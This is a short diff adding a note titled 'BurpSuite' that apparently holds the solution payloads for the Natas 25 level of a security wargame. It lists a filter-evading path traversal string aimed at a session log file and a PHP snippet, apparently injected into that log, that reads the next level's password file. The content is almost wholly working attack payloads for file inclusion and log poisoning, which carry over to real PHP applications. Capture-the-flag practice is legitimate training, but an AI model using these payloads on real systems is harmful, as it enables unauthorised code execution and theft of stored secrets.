@@ -1,0 +1,4 @@
+# BurpSuite
+1) ....//....//....//....//....//var/www/natas/natas25/logs/natas25_<COOKIE>.log
+
+2) <?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>
